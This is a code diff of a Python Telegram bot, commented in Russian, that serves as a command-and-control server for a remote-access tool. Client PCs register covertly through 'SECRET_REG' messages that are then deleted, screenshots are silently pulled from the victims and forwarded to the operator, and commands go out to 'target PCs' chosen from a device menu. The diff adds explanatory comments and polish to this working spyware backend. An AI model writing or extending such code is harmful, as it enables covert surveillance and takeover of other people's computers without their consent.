@@ -5,16 +5,22 @@ from aiogram.filters import Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
 from dotenv import load_dotenv
 
+# Загрузка токена из файла .env
 load_dotenv()
 TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_ID = 123456789  # УКАЖИТЕ СВОЙ ID ЦИФРАМИ
+
+# ВНИМАНИЕ: Замените эти цифры на ваш реальный числовой ID в Telegram!
+# Его можно узнать у бота @userinfobot
+ADMIN_ID = 5153650495
 
 bot = Bot(token=TOKEN)
 dp = Dispatcher()
 
+# Временная база данных для хранения подключенных ПК в оперативной памяти
 connected_pcs = {}
 
 def is_admin(user_id: int) -> bool:
+    """Проверка, что боту пишет именно владелец"""
     return user_id == ADMIN_ID
 
 @dp.message(Command("start"))
@@ -24,25 +30,34 @@ async def cmd_start(message: types.Message):
 
 @dp.message(F.text.startswith("SECRET_REG:"))
 async def register_via_tg(message: types.Message):
+    """Скрытая регистрация ПК при установке или запуске клиента"""
     try: await message.delete()
     except: pass
+    
     try:
         _, device_id, pc_name = message.text.split(":")
+        # Сохраняем имя ПК и время его последнего обнаружения
         connected_pcs[device_id] = {"name": pc_name, "last_seen": asyncio.get_event_loop().time()}
-        print(f"[СЕРВЕР] ПК {pc_name} онлайн.")
+        print(f"[СЕРВЕР] Компьютер \"{pc_name}\" успешно зарегистрирован в системе и онлайн.")
     except Exception as e:
-        print(f"Ошибка регистрации: {e}")
+        print(f"Ошибка при обработке регистрации: {e}")
 
 @dp.message(F.document & F.caption.startswith("SCREEN_REPLY:"))
 async def receive_screenshot(message: types.Message):
+    """Прием скриншота от удаленного ПК и пересылка его вам в чат"""
     if not is_admin(message.from_user.id):
         device_id = message.caption.split(":")[1]
         pc_name = connected_pcs.get(device_id, {}).get("name", "Неизвестный ПК")
+        
+        # Скачиваем файл из скрытого сообщения клиента
         file_id = message.document.file_id
         file = await bot.get_file(file_id)
         file_buffer = await bot.download_file(file.file_path)
+        
+        # Отправляем фото лично вам
         input_file = BufferedInputFile(file_buffer.read(), filename="screenshot.png")
         await bot.send_photo(chat_id=ADMIN_ID, photo=input_file, caption=f"📸 Скриншот с ПК: {pc_name}")
+        
         try: await message.delete()
         except: pass
 
@@ -50,18 +65,20 @@ async def receive_screenshot(message: types.Message):
 async def cmd_devices(message: types.Message):
     if not is_admin(message.from_user.id): return
     if not connected_pcs:
-        await message.answer("❌ Список устройств пуст.")
+        await message.answer("❌ Список устройств пуст. Установите программу на целевые ПК.")
         return
+        
+    # Динамически строим кнопки для каждого ПК
     keyboard = [[InlineKeyboardButton(text=f"💻 {info['name']}", callback_data=f"manage_{dev_id}")] for dev_id, info in connected_pcs.items()]
     await message.answer("🎛 Выберите устройство для управления:", reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
 
-# Главное меню управления устройством (Категории функций)
+# Главное меню управления выбранным компьютером
 @dp.callback_query(F.data.startswith("manage_"))
 async def manage_device(callback: types.CallbackQuery):
     device_id = callback.data.split("_")[1]
     device_info = connected_pcs.get(device_id)
     if not device_info:
-        await callback.answer("❌ Устройство оффлайн.")
+        await callback.answer("❌ Устройство оффлайн или не найдено.")
         return
         
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -71,7 +88,7 @@ async def manage_device(callback: types.CallbackQuery):
         [InlineKeyboardButton(text="🛠 Утилиты и Приложения (12-15)", callback_data=f"cat_util_{device_id}")],
         [InlineKeyboardButton(text="⬅️ Назад к списку", callback_data="back_to_list")]
     ])
-    await callback.message.edit_text(text=f"💻 Управление ПК: *{device_info['name']}*", parse_mode="Markdown", reply_markup=keyboard)
+    await callback.message.edit_text(text=f"💻 Управление ПК: *{device_info['name']}*\n🆔 ID: `{device_id}`", parse_mode="Markdown", reply_markup=keyboard)
 
 # Категория 1: Мониторинг
 @dp.callback_query(F.data.startswith("cat_mon_"))
@@ -126,14 +143,21 @@ async def cat_utilities(callback: types.CallbackQuery):
 
 @dp.callback_query(F.data.startswith("cmd_"))
 async def send_command(callback: types.CallbackQuery):
+    """Отправка команды в Телеграм (клиентский ПК её прочитает)"""
     _, cmd_type, device_id = callback.data.split("_", 2)
+    
+    # Бот шлет триггер-сообщение, которое клиент считает через getUpdates
     await bot.send_message(chat_id=ADMIN_ID, text=f"CMD:{device_id}:{cmd_type}")
-    await callback.answer("🚀 Команда отправлена на исполнение")
+    await callback.answer("🚀 Команда отправлена!")
 
 @dp.callback_query(F.data == "back_to_list")
 async def back_to_list(callback: types.CallbackQuery):
     await callback.message.delete()
     await cmd_devices(callback.message)
 
+async def main():
+    print("[СЕРВЕР] Бот успешно запущен в режиме Long Polling!")
+    await dp.start_polling(bot)
+
 if __name__ == "__main__":
-    asyncio.run(dp.start_polling(bot))
+    asyncio.run(main())
